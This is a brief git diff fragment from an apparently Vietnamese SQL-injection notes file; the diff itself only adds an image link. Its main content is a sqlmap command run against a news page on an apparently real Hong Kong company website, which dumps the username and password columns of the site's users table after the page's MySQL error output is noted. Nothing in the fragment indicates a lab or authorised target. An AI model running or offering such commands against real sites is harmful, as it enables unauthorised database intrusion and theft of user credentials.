@@ -67,3 +67,4 @@ Trang sử dụng MySQL theo thông tin ở `error info`
 
 `sqlmap -u http://www.cmkoo.com.hk/en/news/news.php?id=28 -D cmkoo_com_hk -T users -C Username,Password --dump`
 
+![image](https://github.com/user-attachments/assets/9e52defa-a995-4663-a216-a2744dca9ecb)
